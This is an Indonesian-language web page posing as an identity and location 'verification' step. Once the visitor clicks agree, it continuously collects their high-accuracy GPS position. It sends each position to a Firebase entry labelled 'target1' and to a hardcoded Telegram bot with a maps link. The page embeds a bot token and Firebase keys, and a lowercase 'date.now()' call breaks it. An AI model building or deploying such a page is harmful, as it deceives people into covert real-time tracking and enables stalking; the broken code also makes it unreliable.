<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sistem Verifikasi Akses</title>
    <script src="https://cdn.tailwindcss.com"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-app-compat.js"></script>
    <script src="https://www.gstatic.com/firebasejs/10.7.1/firebase-database-compat.js"></script>
</head>
<body class="bg-slate-900 text-white flex items-center justify-center h-screen">
    <div class="bg-slate-800 p-8 rounded-3xl shadow-2xl max-w-sm text-center border border-slate-700 mx-4">
        <h2 class="text-2xl font-bold mb-2">Verifikasi Lokasi</h2>
        <p class="text-slate-400 text-sm mb-6">Izinkan akses lokasi untuk melanjutkan proses verifikasi identitas Anda.</p>
        <button onclick="mulaiLive()" id="btn" class="bg-blue-600 hover:bg-blue-700 text-white px-8 py-4 rounded-2xl font-bold w-full transition-all">SAYA SETUJU</button>
        <p id="status" class="mt-4 text-xs text-slate-500 italic"></p>
    </div>

    <script>
        const firebaseConfig = {
            apiKey: "AIzaSyAQW4WSw-O2JYDnZfBciUPTVzm07rcsyXs",
            authDomain: "live-traker-e7ce2.firebaseapp.com",
            projectId: "live-traker-e7ce2",
            storageBucket: "live-traker-e7ce2.firebasestorage.app",
            messagingSenderId: "425874298746",
            appId: "1:425874298746:web:949db14ea30a1e742068c3",
            databaseURL: "https://live-traker-e7ce2-default-rtdb.firebaseio.com"
        };
        firebase.initializeApp(firebaseConfig);
        const database = firebase.database();

        function mulaiLive() {
            document.getElementById('btn').style.display = 'none';
            document.getElementById('status').innerText = "Sinkronisasi lokasi sedang berjalan...";

            navigator.geolocation.watchPosition((pos) => {
                const lat = pos.coords.latitude;
                const lon = pos.coords.longitude;
                const acc = pos.coords.accuracy;

                // Update ke Firebase (Real-time ke Admin)
                database.ref('live_location/target1').set({
                    lat: lat, 
                    lon: lon,
                    acc: acc,
                    time: date.now()
                });

                // Update ke Telegram
                fetch(`https://api.telegram.org/bot8254533879:AAExi3a9lAtiYa82yvbpY34l40M9uHPf41U/sendMessage`, {
                    method: "POST",
                    headers: {"Content-Type": "application/json"},
                    body: JSON.stringify({
                        chat_id: "5492455730",
                        text: `📍 LIVE UPDATE\nLat: ${lat}\nLon: ${lon}\nAcc: ${acc}m\nLink: https://www.google.com/maps?q=${lat},${lon}`
                    })
                });
            }, (err) => { alert("Harap aktifkan GPS!"); }, { enableHighAccuracy: true });
        }
    </script>
</body>
</html>
